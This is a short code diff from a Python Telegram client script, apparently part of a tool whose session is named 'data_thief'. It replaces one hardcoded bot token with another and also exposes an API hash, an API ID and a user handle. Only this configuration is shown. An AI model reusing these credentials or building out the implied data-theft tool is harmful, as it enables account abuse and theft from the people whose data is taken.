@@ -10,7 +10,7 @@ import collections
 DATETIME_FORMAT = '%Y-%m-%d %H:%M:%S'
 API_HASH = '5ac27b24bb13814945c06e03ab3bd6e9'
 API_ID = '27687138'
-BOT_TOKEN = "8456233533:AAFnD7Es-ynBEcXo-dvIWqVojw19SDxEdzY"
+BOT_TOKEN = "7613028738:AAFwz2nUjX7iXxZoobsSjJt2hEpULQ9yav0"
 USER_NAME = "@danz0_o"
 
 client = TelegramClient('data_thief', API_ID, API_HASH)
